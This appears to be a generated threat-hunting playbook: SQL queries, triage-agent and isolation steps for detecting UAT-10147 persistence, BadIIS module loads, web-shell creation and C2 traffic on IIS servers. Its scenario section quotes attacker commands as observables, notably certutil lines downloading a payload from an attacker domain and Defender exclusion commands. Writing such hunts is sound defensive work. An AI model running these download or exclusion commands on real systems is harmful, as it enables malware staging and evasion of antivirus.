---
analysis: A standard detection rule might catch the 'Google Chrome Start' string,
  but this hunt correlates that indicator with fleet-wide prevalence, historical vulnerability
  context, and anomalous IIS worker behavior (outbound connections, unsigned module
  loads) to distinguish a targeted campaign from benign tasks.
blind_spots:
- id: insufficient-telemetry-retention
  owner: Security Engineering
  question: whether initial reconnaissance (appcmd) occurred outside the default lookback
    window
  remediation: Increase retention for EDR process events on internet-facing servers.
  requires: 30+ days of process telemetry
  risk: Initial discovery steps might be missed if the lookback window is too short,
    leaving only the long-term persistence visible.
  stage: reconnaissance-and-c2
- id: http-post-body-visibility
  owner: Network Security
  question: what specific system telemetry was exfiltrated to the Nacos server
  remediation: Configure WAF to log specific exfiltration patterns in POST bodies
    for identified C2 endpoints.
  requires: hb_http_activity with body_content capture
  risk: Without POST body visibility, the hunt can identify the connection but cannot
    verify the exact data being stolen.
  stage: data-exfiltration
coverage:
- stage: persistence-establishment
  status: covered
  steps:
  - deceptive-scheduled-tasks
  - rare-scheduled-task-commands
- stage: reconnaissance-and-c2
  status: covered
  steps:
  - iis-reconnaissance
  - badiis-module-load
  - w3wp-outbound-behavior
  - c2-staging-comms-ip
- blind_spot: http-post-body-visibility
  reason: System telemetry exfiltration via HTTP POST bodies is not captured in the
    hb_http_activity metadata-only surface.
  stage: data-exfiltration
  status: not_visible
- reason: Belongs to another part of the 'UAT-10147 integrates agentic AI into post-compromise
    operations' series.
  stage: initial-access-vulnerability-exploitation
  status: out_of_scope
- reason: Belongs to another part of the 'UAT-10147 integrates agentic AI into post-compromise
    operations' series.
  stage: malware-staging-and-download
  status: out_of_scope
- reason: Belongs to another part of the 'UAT-10147 integrates agentic AI into post-compromise
    operations' series.
  stage: privilege-escalation-and-evasion
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: promote-to-detection
  justification: UAT-10147 uses AI-driven playbooks to operationalize one-day exploits
    at scale. Detecting their persistence and exfiltration is critical because these
    behavioral stages are more stable than their rapidly rotating initial access payloads.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An adversary has established long-term persistence on web servers via
  deceptive scheduled tasks or privileged local accounts and is exfiltrating system
  telemetry to cloud sinks while using rogue IIS modules for backdoors.
labels:
- hunt
- attack.t1053.005
- attack.t1021.001
- attack.t1071
- attack.t1090.003
- attack.t1041
- attack.t1505.003
name: UAT-10147 Infrastructure Persistence and C2 Communications
parameters:
  c2_ips:
    default:
    - 139.180.197.150
    description: Observed staging and C2 IP addresses.
    from:
      kind: article
      observed: '2026-02-01'
      ref: https://blog.talosintelligence.com/uat-10147-chinese-speaking-adversary-integrates-agentic-ai-into-post-compromise-operations/
    type: list[ip]
  lookback_days:
    default: '14'
    description: Days of history to examine.
    type: number
  scope_hosts:
    default: []
    description: Optional list of hosts to narrow the behavioral queries.
    type: list[host]
  target_cves:
    default:
    - CVE-2022-27925
    - CVE-2021-23758
    - CVE-2021-29441
    - CVE-2021-29442
    - CVE-2019-18935
    - CVE-2022-0995
    - CVE-2021-3156
    description: CVEs targeted by UAT-10147 for initial access and escalation.
    from:
      kind: article
      observed: '2026-02-01'
      ref: https://blog.talosintelligence.com/uat-10147-chinese-speaking-adversary-integrates-agentic-ai-into-post-compromise-operations/
    type: list[string]
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://blog.talosintelligence.com/uat-10147-chinese-speaking-adversary-integrates-agentic-ai-into-post-compromise-operations/
    gates:
    - dry-run
    - lint
    model: hb_google/gemini-3-flash-preview
rationale: Focus on internet-exposed IIS and Linux web servers. Use the target CVEs
  as the primary scoping filter to identify high-risk assets before running behavioral
  checks.
references:
- name: "Cisco Talos \u2014 UAT-10147 integrates agentic AI into post-compromise operations"
  url: https://blog.talosintelligence.com/uat-10147-chinese-speaking-adversary-integrates-agentic-ai-into-post-compromise-operations/
related:
- hunt: uat-10147-exploitation-and-evasion
  reason: This hunt focuses on the initial access and AV evasion (defender exclusions)
    used by the same group.
  relation: out-of-scope-alternative
- hunt: uat-10147-web-server-exploitation-escalation
  relation: follows
scenario:
  stages:
  - name: Exploitation of Public-Facing Applications
    observables:
    - CVE-2022-27925
    - CVE-2021-23758
    - CVE-2019-18935
    - asp.net
    - web shell deployment
    slug: initial-access-vulnerability-exploitation
    tactic: initial-access
    techniques:
    - T1190
    - T1505.003
  - name: Script-Based Malware Staging
    observables:
    - back.bat
    - back.txt
    - certutil -urlcache -split -f https://adminapi.tippusoni.in/4/dll.zip
    - certutil -urlcache -split -f https://adminapi.tippusoni.in/4/user.txt
    - bai.bat
    slug: malware-staging-and-download
    tactic: execution
    techniques:
    - T1059
    - T1059.001
  - name: Privilege Escalation and Defender Evasion
    observables:
    - prcc1.rar
    - EfsPotato
    - CVE-2022-0847
    - CVE-2021-3156
    - powershell Add-MpPreference -ExclusionPath C:\Windows\System32\inetsrv
    - reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
    slug: privilege-escalation-and-evasion
    tactic: privilege-escalation
    techniques:
    - T1059
  - name: Persistence via Scheduled Tasks and RDP
    observables:
    - Google Chrome Start
    - user.bat
    - Remote Desktop Users
    - local Administrators
    slug: persistence-establishment
    tactic: persistence
    techniques:
    - T1053.005
    - T1021.001
  - name: Discovery and Command and Control
    observables:
    - appcmd list site /config /xml
    - 139.180.197.150
    - Nacos configuration server
    - svchosts.exe
    - QuasarRAT
    - NoodleRAT
    slug: reconnaissance-and-c2
    tactic: command-and-control
    techniques:
    - T1071
    - T1090.003
  - name: System Telemetry Exfiltration
    observables:
    - POST id
    - POST hostname
    - POST %USERNAME%
    - POST %COMPUTERNAME%
    - runtime.exec
    slug: data-exfiltration
    tactic: exfiltration
    techniques:
    - T1041
  summary: UAT-10147 targets Windows and Linux web servers globally by exploiting
    publicly disclosed vulnerabilities like CVE-2022-27925 and CVE-2019-18935. The
    campaign leverages agentic AI to automate post-compromise workflows, including
    privilege escalation via EfsPotato and Dirty Pipe, before establishing persistence
    through scheduled tasks and rogue RDP accounts.
series:
  index: 2
  slug: uat-10147-integrates-agentic-ai-into-post-compromise-operations
  title: UAT-10147 integrates agentic AI into post-compromise operations
  total: 2
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
  network:
    category: network
    name: Network telemetry
    telemetry:
    - network
tlp: clear
type: investigation
---


# UAT-10147 Infrastructure Persistence and C2 Communications

This hunt targets the post-compromise tradecraft of UAT-10147, focusing on persistence (fake 'Google Chrome Start' tasks), IIS module injection (BadIIS), and asynchronous exfiltration of system metadata. It correlates RDP-related group modifications, IIS reconnaissance using appcmd, and unusual outbound network traffic from web server processes. The hunt prioritizes hosts known to be vulnerable to the actor's targeted CVE list and identifies rare persistence entries and unauthorized file modifications within web roots.

## vulnerable-host-scoping
<!-- Identify hostnames with targeted 1-day vulnerabilities -->
Prioritize hosts known to be vulnerable to the CVEs UAT-10147 is actively exploiting, resolved to hostnames for later filtering.

```sqlite target=endpoint role=scoping params=(target_cves=target_cves)
~~~yaml
expected: Hostnames with unpatched vulnerabilities from the report. Silence means
  no known vulnerable hosts are in current inventory.
reads:
- device_uid
- cve_uid
- severity
- affected_package_name
- hostname
- provider
silence: not_evidence_of_absence
source: hb_vulnerability_finding
verified: dry-run
verified_at: '2026-09-17'
~~~
SELECT d.hostname AS device_hostname, v.cve_uid, v.severity, v.affected_package_name FROM hb_vulnerability_finding v JOIN hb_devices d ON v.device_uid = d.device_uid AND v.provider = d.provider WHERE instr(',' || '{{target_cves}}' || ',', ',' || v.cve_uid || ',') > 0
```

## monitor-indicators
<!-- Gather independent behavioral evidence -->
parallel:
- → deceptive-scheduled-tasks
- → rare-scheduled-task-commands
- → iis-reconnaissance
- → badiis-module-load
- → web-shell-creation
- → w3wp-outbound-behavior
- → c2-staging-comms-ip
join: → triage-agent

## deceptive-scheduled-tasks
<!-- Detection of Deceptive 'Google Chrome Start' Tasks -->
Identify the primary persistence mechanism observed in UAT-10147 campaigns.

```sqlite target=endpoint role=detection-candidate params=(scope_hosts=scope_hosts, lookback_days=lookback_days)
~~~yaml
expected: A job named 'Google Chrome Start' or a task executing one of the actor's
  staging batch files.
reads:
- device_hostname
- job_name
- job_cmd_line
- job_user_name
- time
silence: evidence_of_absence
source: hb_scheduled_job
verified: dry-run
verified_at: '2026-09-17'
~~~
SELECT device_hostname, job_name, job_cmd_line, job_user_name, time FROM hb_scheduled_job WHERE (LOWER(job_name) = 'google chrome start' OR LOWER(job_cmd_line) LIKE '%user.bat%' OR LOWER(job_cmd_line) LIKE '%back.bat%') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## rare-scheduled-task-commands
<!-- Identify rare task command lines across the fleet -->
Use prevalence to highlight anomalous persistence mechanisms that mimic legitimate scripts but are unique to a few hosts.

```sqlite target=endpoint role=baseline params=(lookback_days=lookback_days)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: Command lines involving scripts or archive files seen on very few hosts.
prevalence:
  by: device_hostname
  key:
  - job_cmd_line
  rare_below: 3
reads:
- job_cmd_line
- device_hostname
- time
silence: not_evidence_of_absence
source: hb_scheduled_job
verified: dry-run
verified_at: '2026-09-17'
~~~
SELECT job_cmd_line, COUNT(DISTINCT device_hostname) AS hosts, MIN(time) AS first_seen FROM hb_scheduled_job WHERE (LOWER(job_cmd_line) LIKE '%.bat%' OR LOWER(job_cmd_line) LIKE '%.rar%' OR LOWER(job_cmd_line) LIKE '%powershell%') AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY job_cmd_line HAVING hosts <= 2 ORDER BY hosts ASC
```

## iis-reconnaissance
<!-- Identify IIS configuration discovery behavior -->
Detect the use of appcmd to enumerate site configurations, a prerequisite for BadIIS module injection.

```sqlite target=endpoint role=triage params=(scope_hosts=scope_hosts, lookback_days=lookback_days)
~~~yaml
expected: Process execution of appcmd with XML list site parameters, particularly
  on vulnerable servers.
reads:
- device_hostname
- process_cmd_line
- parent_process_name
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-17'
~~~
SELECT device_hostname, process_cmd_line, parent_process_name, time FROM hb_process_activity WHERE LOWER(process_name) LIKE '%appcmd.exe%' AND LOWER(process_cmd_line) LIKE '%list site%' AND LOWER(process_cmd_line) LIKE '%/xml%' AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## badiis-module-load
<!-- Suspect IIS Module Loads (BadIIS) -->
Identify DLLs loaded into IIS processes that are unsigned or loaded from suspicious temporary directories.

```sqlite target=endpoint role=enrichment params=(scope_hosts=scope_hosts, lookback_days=lookback_days)
~~~yaml
expected: A DLL loaded into a web server process that lacks a signature or resides
  in a world-writable directory.
reads:
- device_hostname
- process_name
- module_name
- module_path
- module_signed
- time
silence: not_evidence_of_absence
source: hb_module_activity
verified: dry-run
verified_at: '2026-09-17'
~~~
SELECT device_hostname, process_name, module_name, module_path, module_signed, time FROM hb_module_activity WHERE (LOWER(process_name) LIKE '%w3wp.exe%' OR LOWER(process_name) LIKE '%iisexpress.exe%') AND (LOWER(module_path) LIKE 'c:\windows\temp\%' OR module_signed = 0) AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## web-shell-creation
<!-- Web Shell file creation in web roots -->
Identify the creation of .aspx or .php scripts by web server users or processes, typical of a web shell deployment.

```sqlite target=endpoint role=enrichment params=(scope_hosts=scope_hosts, lookback_days=lookback_days)
~~~yaml
expected: Creation of executable web content in standard IIS paths by privileged or
  service accounts.
reads:
- device_hostname
- file_path
- file_name
- process_name
- actor_user_name
- time
silence: not_evidence_of_absence
source: hb_file_activity
verified: dry-run
verified_at: '2026-09-17'
~~~
SELECT device_hostname, file_path, process_name, actor_user_name, time FROM hb_file_activity WHERE activity_id = 1 AND (LOWER(file_name) LIKE '%.aspx' OR LOWER(file_name) LIKE '%.php') AND (LOWER(process_name) LIKE '%w3wp.exe%' OR LOWER(actor_user_name) LIKE '%system%') AND (LOWER(file_path) LIKE '%\wwwroot\%' OR LOWER(file_path) LIKE '%\inetpub\%') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## w3wp-outbound-behavior
<!-- Anomalous outbound w3wp network connections -->
Detect w3wp.exe initiating outbound TCP connections, which is abnormal for a process typically serving inbound requests.

```sqlite target=network role=triage params=(scope_hosts=scope_hosts, lookback_days=lookback_days)
~~~yaml
expected: Direct outbound TCP connections to external IPs from the IIS worker process,
  suggesting a reverse shell or exfiltration.
reads:
- device_hostname
- dst_endpoint_ip
- dst_endpoint_port
- process_name
- direction
- time
silence: not_evidence_of_absence
source: hb_network_connection
verified: dry-run
verified_at: '2026-09-17'
~~~
SELECT device_hostname, dst_endpoint_ip, dst_endpoint_port, process_name, time FROM hb_network_connection WHERE LOWER(process_name) LIKE '%w3wp.exe%' AND direction = 'outbound' AND disposition = 'Allowed' AND (dst_endpoint_ip NOT LIKE '10.%' AND dst_endpoint_ip NOT LIKE '192.168.%' AND dst_endpoint_ip NOT LIKE '172.%' AND dst_endpoint_ip <> '127.0.0.1') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## c2-staging-comms-ip
<!-- Network connections to UAT-10147 staging IP -->
Identify direct traffic to the known malicious staging and C2 server.

```sqlite target=network role=enrichment params=(c2_ips=c2_ips, scope_hosts=scope_hosts, lookback_days=lookback_days)
~~~yaml
expected: Connections from web servers to the staging IP (139.180.197.150).
reads:
- device_hostname
- dst_endpoint_ip
- process_name
- time
silence: not_evidence_of_absence
source: hb_network_connection
verified: dry-run
verified_at: '2026-09-17'
~~~
SELECT device_hostname, dst_endpoint_ip, process_name, time FROM hb_network_connection WHERE instr(',' || '{{c2_ips}}' || ',', ',' || dst_endpoint_ip || ',') > 0 AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## triage-agent
<!-- Synthesize Post-Compromise Evidence -->
```agent target=hunter
cite: required
context:
- vulnerable-host-scoping
- deceptive-scheduled-tasks
- rare-scheduled-task-commands
- iis-reconnaissance
- badiis-module-load
- web-shell-creation
- w3wp-outbound-behavior
- c2-staging-comms-ip
max_iterations: 6
objective: Determine if any host shows a transition from being vulnerable to performing
  post-compromise persistence, BadIIS module loading, and exfiltration as described
  in the UAT-10147 report.
success_criteria: A per-host verdict citing specific rows from the persistence, file,
  module, and network evidence.
tools:
- endpoint
- network
```

## verdict-decision
<!-- Route based on Triage Verdict -->
if~: "the triage verdict is malicious for at least one host based on the presence of deceptive persistence and anomalous w3wp behavior" (confidence: high, judge=hunter)
then: → isolate-host
indeterminate: → manual-review
unavailable: → manual-review (blind_spot: insufficient-telemetry-retention)
else: → manual-review

## isolate-host
<!-- Isolate Maliciously Affected Host -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the host, terminate any running suspicious worker processes or batch scripts, and remove the unauthorized IIS modules and scheduled tasks.
```
→ manual-review

## manual-review
<!-- Analyst Manual Review -->
```manual target=analyst
Review the cited rows for evidence of new local user account creation (Administrators/Remote Desktop Users) and additions. Inspect the file system for the DLLs identified in the module activity step to confirm if they are malicious BadIIS variants.
```
→ end
